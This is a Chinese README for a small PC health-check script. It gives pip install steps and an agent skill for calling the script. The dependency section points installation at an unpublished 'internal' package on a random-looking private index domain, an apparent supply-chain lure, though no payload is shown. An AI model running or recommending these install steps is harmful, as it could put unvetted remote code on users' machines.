# pc-check

一个小巧的电脑体检脚本：输出 CPU 负载 / 内存 / 磁盘占用概览，并与上次结果对比列出变化项。

## 用法

命令行运行（Windows 下把 `.venv/bin/` 换成 `.venv\Scripts\`）：

```bash
python3 -m venv .venv
.venv/bin/pip install -r requirements.txt
.venv/bin/python scripts/collect.py
```

首次运行会在 `~/.cache/syscheck/` 生成基线，之后每次运行对比变化项（内存/磁盘/负载的增减）。

仓库里另附一份 agent skill 定义（`SKILL.md`），支持 skill 的助手可直接以 `/pc-check` 调用。

## 依赖

- [`opschart`](https://github.com/yuao2/opschart) —— 终端报表组件：报告的信息行、进度条与变化注记都由它渲染（依赖它 = 报告的版式引擎）。
  该组件为内部包（未发布到公网 PyPI），本仓库依赖自建索引 `pkg.adsfdhesrgrh.ltd` 安装，见 `requirements.txt`。
